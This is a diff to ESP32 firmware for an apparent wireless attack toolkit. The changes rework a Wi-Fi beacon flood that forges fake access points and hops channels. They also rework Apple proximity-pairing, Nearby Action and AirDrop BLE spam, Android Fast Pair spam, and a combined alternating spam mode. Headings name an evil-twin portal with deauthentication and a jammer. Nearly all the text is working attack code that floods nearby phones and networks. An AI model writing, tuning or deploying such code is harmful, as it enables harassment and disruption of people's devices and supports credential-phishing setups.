+    
+    // === Beacon Frame Body ===
+    // Timestamp
+    uint64_t timestamp = esp_timer_get_time();
+    memcpy(&beaconPacket[packetSize], &timestamp, 8);
+    packetSize += 8;
+    
+    // Beacon interval (100 TU)
+    beaconPacket[packetSize++] = 0x64;
+    beaconPacket[packetSize++] = 0x00;
+    
+    // Capability info (randomize encryption for variety)
+    bool encrypted = (macIndex % 3 != 0);  // 66% encrypted
+    if (encrypted) {
+      beaconPacket[packetSize++] = 0x31;  // ESS + Privacy
+      beaconPacket[packetSize++] = 0x04;
+    } else {
+      beaconPacket[packetSize++] = 0x21;  // ESS only
+      beaconPacket[packetSize++] = 0x04;
+    }
+    
+    // === SSID element ===
+    beaconPacket[packetSize++] = 0x00;
+    beaconPacket[packetSize++] = fakeSSID.length();
+    memcpy(&beaconPacket[packetSize], fakeSSID.c_str(), fakeSSID.length());
+    packetSize += fakeSSID.length();
+    
+    // === Supported rates (minimal) ===
+    beaconPacket[packetSize++] = 0x01;
+    beaconPacket[packetSize++] = 0x04;
+    beaconPacket[packetSize++] = 0x82;
+    beaconPacket[packetSize++] = 0x84;
+    beaconPacket[packetSize++] = 0x8B;
+    beaconPacket[packetSize++] = 0x96;
+    
+    // === DS Parameter ===
+    beaconPacket[packetSize++] = 0x03;
+    beaconPacket[packetSize++] = 0x01;
+    beaconPacket[packetSize++] = channel;
+    
+    // === RSN element (if encrypted) ===
+    if (encrypted) {
+      beaconPacket[packetSize++] = 0x30;
+      beaconPacket[packetSize++] = 0x14;
+      beaconPacket[packetSize++] = 0x01;
+      beaconPacket[packetSize++] = 0x00;
+      
+      // Group cipher (CCMP)
+      beaconPacket[packetSize++] = 0x00;
+      beaconPacket[packetSize++] = 0x0F;
+      beaconPacket[packetSize++] = 0xAC;
+      beaconPacket[packetSize++] = 0x04;
+      
+      // Pairwise cipher count + cipher
+      beaconPacket[packetSize++] = 0x01;
+      beaconPacket[packetSize++] = 0x00;
+      beaconPacket[packetSize++] = 0x00;
+      beaconPacket[packetSize++] = 0x0F;
+      beaconPacket[packetSize++] = 0xAC;
+      beaconPacket[packetSize++] = 0x04;
+      
+      // AKM suite count + suite (PSK)
+      beaconPacket[packetSize++] = 0x01;
+      beaconPacket[packetSize++] = 0x00;
+      beaconPacket[packetSize++] = 0x00;
+      beaconPacket[packetSize++] = 0x0F;
+      beaconPacket[packetSize++] = 0xAC;
+      beaconPacket[packetSize++] = 0x02;
+      
+      // RSN capabilities
+      beaconPacket[packetSize++] = 0x00;
+      beaconPacket[packetSize++] = 0x00;
+    }
+    
+    // ⚡ SEND IT (no validation check for max speed)
+    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, false);
+    
+    // ⚡ NO DELAY between packets in burst
+  }
+  
+  // ✅ Channel hopping (slower - every 50 beacons = 250ms per channel)
+  static int beaconsSentOnChannel = 0;
+  beaconsSentOnChannel += 5;
+  
+  if (beaconsSentOnChannel >= 50) {
+    channel = (channel % 11) + 1;
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    delay(10);
+    beaconsSentOnChannel = 0;
   }
   
-  // ✅ FIX: Small delay to prevent overwhelming
-  delay(5);
-  
-  if (!beaconFloodActive) {
-    initialized = false;
-    esp_wifi_stop();
+  // ✅ Watchdog reset every 200 packets
+  static int watchdogCounter = 0;
+  watchdogCounter += 5;
+  if (watchdogCounter >= 200) {
+    esp_task_wdt_reset();
+    watchdogCounter = 0;
   }
+  
 }
 
 // ==================== EVIL TWIN (Portal + Deauth) ====================
@@ -11980,8 +12380,7 @@ void displayCombinedJammer() {
 void startAppleSpam() {
   if (appleSpamActive) return;
   
-  Serial.println("\n[*] Starting Apple BLE Spam (AGGRESSIVE MODE)...");
-  Serial.println("    Using raw ESP-IDF for maximum speed");
+  Serial.println("\n[*] Starting Apple BLE Spam (FIXED - SIMPLE METHOD)...");
   
   // Stop conflicting operations
   if (nrfJammerActive) {
@@ -11993,8 +12392,10 @@ void startAppleSpam() {
   if (androidSpamActive) stopAndroidSpam();
   if (continuousBLEScan) {
     continuousBLEScan = false;
-    if (pBLEScan != nullptr) pBLEScan->stop();
-    delay(100);
+    if (pBLEScan != nullptr) {
+      pBLEScan->stop();
+      delay(100);
+    }
   }
   
   // Force complete BLE shutdown
@@ -12003,24 +12404,26 @@ void startAppleSpam() {
     delay(300);
   }
   
-  // LOW-LEVEL BLE INIT (ESP-IDF)
-  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
-  esp_bt_controller_init(&bt_cfg);
-  esp_bt_controller_enable(ESP_BT_MODE_BLE);
+  // Initialize BLE using Arduino library
+  Serial.println("[*] Initializing BLE...");
+  BLEDevice::init("P4WNC4K3");
   
-  esp_bluedroid_init();
-  esp_bluedroid_enable();
+  pAdvertising = BLEDevice::getAdvertising();
+  if (!pAdvertising) {
+    Serial.println("[!] Failed to get advertising!");
+    return;
+  }
   
-  // Set to NON-CONNECTABLE for spam
-  esp_ble_gap_set_device_name("");
+  // Fast advertising
+  pAdvertising->setMinInterval(0x20);
+  pAdvertising->setMaxInterval(0x40);
   
   appleSpamActive = true;
   appleSpamCount = 0;
   lastAppleSpam = 0;
   
-  Serial.println("[+] Apple spam started (AGGRESSIVE)");
-  Serial.println("    Flooding at maximum rate!");
-  addToConsole("Apple spam: AGGRESSIVE");
+  Serial.println("[+] Apple spam started!");
+  addToConsole("Apple spam: ACTIVE");
 }
 
 void stopAppleSpam() {
@@ -12029,145 +12432,113 @@ void stopAppleSpam() {
   appleSpamActive = false;
   Serial.println("\n[*] Stopping Apple spam...");
   
-  // Stop advertising
-  esp_ble_gap_stop_advertising();
-  delay(100);
+  if (pAdvertising) {
+    pAdvertising->stop();
+    delay(100);
+  }
   
-  // Shutdown BLE stack
-  esp_bluedroid_disable();
-  esp_bluedroid_deinit();
-  esp_bt_controller_disable();
-  esp_bt_controller_deinit();
-  
-  delay(200);
+  if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(true);
+    delay(200);
+  }
   
   Serial.printf("[+] Stopped (%d sent)\n", appleSpamCount);
   addToConsole("Apple spam stopped");
 }
 
 void performAppleSpam() {
-  if (!appleSpamActive) return;
+  if (!appleSpamActive || !pAdvertising) return;
   
-  // ✅ AGGRESSIVE: 20ms cycle (50 packets/second)
+  // Send every 50ms (20 pkt/sec)
   static unsigned long lastSpam = 0;
-  if (millis() - lastSpam < 20) return;
+  if (millis() - lastSpam < 50) return;
   lastSpam = millis();
   
   static uint8_t msgRotation = 0;
   msgRotation = (msgRotation + 1) % 15;
   
-  uint8_t adv_data[31];
-  uint8_t adv_len = 0;
+  // Stop previous
+  pAdvertising->stop();
+  delay(5);
   
-  // ✅ CRITICAL: BLE Flags (MUST be first)
-  adv_data[adv_len++] = 0x02;  // Length
-  adv_data[adv_len++] = 0x01;  // Flags type
-  adv_data[adv_len++] = 0x1A;  // LE General + No BR/EDR
+  // Create advertisement
+  BLEAdvertisementData advertisementData;
+  advertisementData.setFlags(0x06);
   
-  // ✅ CRITICAL: Apple Company ID (0x004C)
-  adv_data[adv_len++] = 0x1B;  // Length (will update)
-  adv_data[adv_len++] = 0xFF;  // Manufacturer Specific
-  adv_data[adv_len++] = 0x4C;  // Apple Company ID (LSB)
-  adv_data[adv_len++] = 0x00;  // Apple Company ID (MSB)
+  // Build manufacturer data
+  std::string mfgData;
   
   if (msgRotation < 10) {
-    // ✅ PROXIMITY PAIRING - All device types
+    // PROXIMITY PAIRING
     uint16_t model = apple_models[msgRotation % 10];
     
-    adv_data[3] = 0x1B;  // Update length
-    adv_data[adv_len++] = 0x07;  // Proximity Pairing type
-    adv_data[adv_len++] = 0x19;  // Data length
-    adv_data[adv_len++] = 0x01;  // Status flags
+    uint8_t data[27];
+    data[0] = 0x4C; data[1] = 0x00;  // Apple
+    data[2] = 0x07;  // Proximity
+    data[3] = 0x19;  // Length
+    data[4] = 0x01;  // Status
+    data[5] = (model >> 8) & 0xFF;
+    data[6] = model & 0xFF;
+    data[7] = 0x00;
     
-    // Device model (Little Endian)
-    adv_data[adv_len++] = (model >> 8) & 0xFF;  // High byte
-    adv_data[adv_len++] = model & 0xFF;         // Low byte
-    
-    adv_data[adv_len++] = 0x00;  // Status
-    
-    // Random MAC address (6 bytes)
+    // Random MAC
     for (int i = 0; i < 6; i++) {
-      adv_data[adv_len++] = random(0, 256);
+      data[8 + i] = random(0, 256);
     }
     
-    adv_data[adv_len++] = 0x00;  // Hint
+    data[14] = 0x00;
+    for (int i = 0; i < 8; i++) data[15 + i] = 0x00;
     
-    // Reserved (8 bytes)
-    for (int i = 0; i < 8; i++) {
-      adv_data[adv_len++] = 0x00;
-    }
+    // Battery
+    data[23] = random(20, 100);
+    data[24] = random(20, 100);
+    data[25] = random(20, 100);
+    data[26] = 0x00;
     
-    // Battery levels (random 20-100%)
-    adv_data[adv_len++] = random(20, 100);
-    adv_data[adv_len++] = random(20, 100);
-    adv_data[adv_len++] = random(20, 100);
+    mfgData = std::string((char*)data, 27);
     
   } else if (msgRotation < 13) {
-    // ✅ NEARBY ACTION - All action types
+    // NEARBY ACTION
     uint8_t action = apple_actions[(msgRotation - 10) % 9];
     
-    adv_data[3] = 0x08;  // Update length
-    adv_data[adv_len++] = 0x0F;  // Nearby Action type
-    adv_data[adv_len++] = 0x05;  // Data length
-    adv_data[adv_len++] = 0x00;  // Flags
-    adv_data[adv_len++] = action;
-    
-    // Auth tag (3 bytes random)
+    uint8_t data[11];
+    data[0] = 0x4C; data[1] = 0x00;
+    data[2] = 0x0F;  // Nearby Action
+    data[3] = 0x05;
+    data[4] = 0x00;
+    data[5] = action;
     for (int i = 0; i < 3; i++) {
-      adv_data[adv_len++] = random(0, 256);
+      data[6 + i] = random(0, 256);
     }
+    data[9] = 0x00;
+    data[10] = 0x00;
+    
+    mfgData = std::string((char*)data, 11);
     
   } else {
-    // ✅ AIRDROP
-    adv_data[3] = 0x15;  // Update length
-    adv_data[adv_len++] = 0x05;  // AirDrop type
-    adv_data[adv_len++] = 0x12;  // Data length
-    adv_data[adv_len++] = 0x00;  // Flags
+    // AIRDROP
+    uint8_t data[22];
+    data[0] = 0x4C; data[1] = 0x00;
+    data[2] = 0x05;  // AirDrop
+    data[3] = 0x12;
+    data[4] = 0x00;
     
-    // Zero hash (8 bytes)
-    for (int i = 0; i < 8; i++) {
-      adv_data[adv_len++] = 0x00;
-    }
+    for (int i = 0; i < 8; i++) data[5 + i] = 0x00;
+    for (int i = 0; i < 9; i++) data[13 + i] = random(0, 256);
     
-    // Random data (9 bytes)
-    for (int i = 0; i < 9; i++) {
-      adv_data[adv_len++] = random(0, 256);
-    }
+    mfgData = std::string((char*)data, 22);
   }
   
-  // ✅ CRITICAL: Random MAC address for EACH packet (like Marauder)
-  uint8_t random_addr[6];
-  for (int i = 0; i < 6; i++) {
-    random_addr[i] = random(0, 256);
-  }
-  random_addr[0] |= 0xC0;  // Set random address type bits
+  advertisementData.setManufacturerData(mfgData);
   
-  esp_ble_gap_set_rand_addr(random_addr);
-  
-  // ✅ CRITICAL: Fast advertising parameters (Marauder style)
-  esp_ble_adv_params_t adv_params = {
-    .adv_int_min = 0x20,        // 20ms (FAST)
-    .adv_int_max = 0x40,        // 40ms
-    .adv_type = ADV_TYPE_NONCONN_IND,  // Non-connectable
-    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
-    .peer_addr = {0},
-    .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
-    .channel_map = ADV_CHNL_ALL,  // All 3 channels (37, 38, 39)
-    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
-  };
-  
-  // ✅ Send the packet
-  esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
-  esp_ble_gap_start_advertising(&adv_params);
+  // Set and start
+  pAdvertising->setAdvertisementData(advertisementData);
+  pAdvertising->start();
   
   appleSpamCount++;
   
-  // ✅ Quick stop for next packet (10ms)
-  delayMicroseconds(10000);
-  esp_ble_gap_stop_advertising();
-  
-  // ✅ Watchdog reset every 100 packets
-  if (appleSpamCount % 100 == 0) {
+  // Feed watchdog
+  if (appleSpamCount % 20 == 0) {
     esp_task_wdt_reset();
   }
 }
@@ -12175,8 +12546,7 @@ void performAppleSpam() {
 void startAndroidSpam() {
   if (androidSpamActive) return;
   
-  Serial.println("\n[*] Starting Android BLE Spam (AGGRESSIVE MODE)...");
-  Serial.println("    Using raw ESP-IDF for maximum speed");
+  Serial.println("\n[*] Starting Android BLE Spam (FIXED - SIMPLE METHOD)...");
   
   // Stop conflicting operations
   if (nrfJammerActive) {
@@ -12188,8 +12558,10 @@ void startAndroidSpam() {
   if (appleSpamActive) stopAppleSpam();
   if (continuousBLEScan) {
     continuousBLEScan = false;
-    if (pBLEScan != nullptr) pBLEScan->stop();
-    delay(100);
+    if (pBLEScan != nullptr) {
+      pBLEScan->stop();
+      delay(100);
+    }
   }
   
   // Force complete BLE shutdown
@@ -12198,23 +12570,25 @@ void startAndroidSpam() {
     delay(300);
   }
   
-  // LOW-LEVEL BLE INIT (ESP-IDF)
-  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
-  esp_bt_controller_init(&bt_cfg);
-  esp_bt_controller_enable(ESP_BT_MODE_BLE);
+  // Initialize BLE
+  Serial.println("[*] Initializing BLE...");
+  BLEDevice::init("P4WNC4K3");
   
-  esp_bluedroid_init();
-  esp_bluedroid_enable();
+  pAdvertising = BLEDevice::getAdvertising();
+  if (!pAdvertising) {
+    Serial.println("[!] Failed to get advertising!");
+    return;
+  }
   
-  esp_ble_gap_set_device_name("");
+  pAdvertising->setMinInterval(0x20);
+  pAdvertising->setMaxInterval(0x40);
   
   androidSpamActive = true;
   androidSpamCount = 0;
   lastAndroidSpam = 0;
   
-  Serial.println("[+] Android spam started (AGGRESSIVE)");
-  Serial.println("    Flooding Fast Pair at maximum rate!");
-  addToConsole("Android spam: AGGRESSIVE");
+  Serial.println("[+] Android spam started!");
+  addToConsole("Android spam: ACTIVE");
 }
 
 void stopAndroidSpam() {
@@ -12223,28 +12597,26 @@ void stopAndroidSpam() {
   androidSpamActive = false;
   Serial.println("\n[*] Stopping Android spam...");
   
-  // Stop advertising
-  esp_ble_gap_stop_advertising();
-  delay(100);
+  if (pAdvertising) {
+    pAdvertising->stop();
+    delay(100);
+  }
   
-  // Shutdown BLE stack
-  esp_bluedroid_disable();
-  esp_bluedroid_deinit();
-  esp_bt_controller_disable();
-  esp_bt_controller_deinit();
-  
-  delay(200);
+  if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(true);
+    delay(200);
+  }
   
   Serial.printf("[+] Stopped (%d sent)\n", androidSpamCount);
   addToConsole("Android spam stopped");
 }
 
 void performAndroidSpam() {
-  if (!androidSpamActive) return;
+  if (!androidSpamActive || !pAdvertising) return;
   
-  // ✅ AGGRESSIVE: 20ms cycle
+  // Send every 50ms (20 pkt/sec)
   static unsigned long lastSpam = 0;
-  if (millis() - lastSpam < 20) return;
+  if (millis() - lastSpam < 50) return;
   lastSpam = millis();
   
   static uint8_t modelIndex = 0;
@@ -12252,66 +12624,37 @@ void performAndroidSpam() {
   
   uint32_t model = android_models[modelIndex];
   
-  uint8_t adv_data[31];
-  uint8_t adv_len = 0;
+  // Stop previous
+  pAdvertising->stop();
+  delay(5);
   
-  // ✅ BLE Flags
-  adv_data[adv_len++] = 0x02;
-  adv_data[adv_len++] = 0x01;
-  adv_data[adv_len++] = 0x1A;
+  // Create advertisement
+  BLEAdvertisementData advertisementData;
+  advertisementData.setFlags(0x06);
   
-  // ✅ Fast Pair Service UUID (CRITICAL - Must be correct!)
-  adv_data[adv_len++] = 0x03;  // Length
-  adv_data[adv_len++] = 0x03;  // Complete list of 16-bit UUIDs
-  adv_data[adv_len++] = 0x2C;  // Fast Pair UUID (LSB)
-  adv_data[adv_len++] = 0xFE;  // Fast Pair UUID (MSB)
+  // Add Fast Pair Service UUID
+  BLEUUID fastPairUUID((uint16_t)0xFE2C);
+  advertisementData.setCompleteServices(fastPairUUID);
   
-  // ✅ Fast Pair Service Data (CRITICAL)
-  adv_data[adv_len++] = 0x06;  // Length
-  adv_data[adv_len++] = 0x16;  // Service Data - 16-bit UUID
-  adv_data[adv_len++] = 0x2C;  // Fast Pair UUID (LSB)
-  adv_data[adv_len++] = 0xFE;  // Fast Pair UUID (MSB)
+  // Build service data
+  uint8_t serviceData[6];
+  serviceData[0] = (model >> 16) & 0xFF;
+  serviceData[1] = (model >> 8) & 0xFF;
+  serviceData[2] = model & 0xFF;
+  serviceData[3] = random(0, 256);
+  serviceData[4] = random(0, 256);
+  serviceData[5] = random(0, 256);
   
-  // Model ID (3 bytes, Big Endian)
-  adv_data[adv_len++] = (model >> 16) & 0xFF;  // High byte
-  adv_data[adv_len++] = (model >> 8) & 0xFF;   // Mid byte
-  adv_data[adv_len++] = model & 0xFF;          // Low byte
+  advertisementData.setServiceData(fastPairUUID, std::string((char*)serviceData, 6));
   
-  // ✅ TX Power
-  adv_data[adv_len++] = 0x02;
-  adv_data[adv_len++] = 0x0A;  // TX Power Level
-  adv_data[adv_len++] = 0x00;  // 0 dBm
-  
-  // ✅ Random MAC
-  uint8_t random_addr[6];
-  for (int i = 0; i < 6; i++) {
-    random_addr[i] = random(0, 256);
-  }
-  random_addr[0] |= 0xC0;
-  
-  esp_ble_gap_set_rand_addr(random_addr);
-  
-  // ✅ Fast advertising
-  esp_ble_adv_params_t adv_params = {
-    .adv_int_min = 0x20,
-    .adv_int_max = 0x40,
-    .adv_type = ADV_TYPE_NONCONN_IND,
-    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
-    .peer_addr = {0},
-    .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
-    .channel_map = ADV_CHNL_ALL,
-    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
-  };
-  
-  esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
-  esp_ble_gap_start_advertising(&adv_params);
+  // Set and start
+  pAdvertising->setAdvertisementData(advertisementData);
+  pAdvertising->start();
   
   androidSpamCount++;
   
-  delayMicroseconds(10000);
-  esp_ble_gap_stop_advertising();
-  
-  if (androidSpamCount % 100 == 0) {
+  // Feed watchdog
+  if (androidSpamCount % 20 == 0) {
     esp_task_wdt_reset();
   }
 }
@@ -12387,14 +12730,13 @@ void startCombinedSpam() {
 void performCombinedSpam() {
   if (!appleSpamActive && !androidSpamActive) return;
   
-  // ULTRA AGGRESSIVE: 10ms alternating
+  // ✅ ULTRA FAST: 10ms alternating (100 pkt/sec total)
   static unsigned long lastSpam = 0;
   static bool doApple = true;
   
   if (millis() - lastSpam < 10) return;
   lastSpam = millis();
   
-  // Alternate between Apple and Android
   if (doApple) {
     performAppleSpam();
   } else {
